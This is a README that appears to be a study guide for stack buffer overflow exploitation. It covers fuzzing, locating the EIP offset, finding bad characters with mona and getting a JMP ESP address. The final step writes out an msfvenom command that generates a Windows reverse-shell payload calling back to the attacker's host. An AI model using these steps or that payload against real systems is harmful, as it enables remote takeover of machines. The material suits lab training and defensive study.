
# Buffer Overflow Exploit Development Guide / Immunity Debugger

This README provides a comprehensive guide to exploiting a buffer overflow vulnerability using Immunity Debugger and Metasploit. Follow the steps below to find the offset, identify bad characters, and create a payload to execute your exploit.

## Setup

### Configure Immunity Debugger

1. **Open Immunity Debugger**.
2. **Set the working folder for mona**:
   ```shell
   !mona config -set workingfolder c:\mona\%p
   ```

## Fuzzing the Target

1. **Fuzz the application to determine the crash point**. Check the EIP register has been overwritten. Save the number of bytes (referred to as `BYTECRASH`) that caused the crash for future steps.
```shell
   python3 1-fuzz.py --ip <IP> --port <PORT> --prefix "<COMMAND> "
   ```
## Finding the Offset

1. **Create a pattern of bytes to locate the offset**:
   ```shell
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l BYTECRASH+400
   ```
2. **Make it crash with the pattern**
   ```shell
   python3 2-offset.py <PATTERN>
   ```
3. **Find the offset distance**:
   ```shell
   !mona findmsp -d BYTECRASH+400
   ```
   Alternatively, you can use:
   ```shell
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l BYTECRASH+400 -q <EIP>
   ```
   Note the EIP sweet spot `OFFSET`


## Identifying Bad Characters

1. **Generate a byte array excluding null byte (`\x00`)**:
   ```shell
   !mona bytearray -b "\x00"
   ```
2. **Make the application crash with the bad character payload**.
   ```shell
   python3 3-badchars.py
   ```
3. **Compare the byte array**:
   ```shell
   !mona compare -f c:\mona\%p\bytearray.bin -a <esp|ESP address>
   ```
4. **Update the list of bad characters**:
   - Add the found bad characters to `generate-badchar.py`.
   - Note: It is usually every 2nd character after the first two characters.
5. **Repeat step 3 until no bad characters are found**.

## Finding Jump Points

1. **Find suitable JMP points**:
   ```shell
   !mona jmp -r esp -cbp "\x00\x..."  # Include all bad characters identified
   ```

## Creating the Payload

1. **Generate the payload with Metasploit**:
   ```shell
   msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 EXITFUNC=thread -b "<BADCHARS|\x00\x..>" -f python -v "shellcode"
   ```
2. **Update the return address (`RETN`) in little-endian format in your exploit script (e.g., `4-exploit.py`)**.


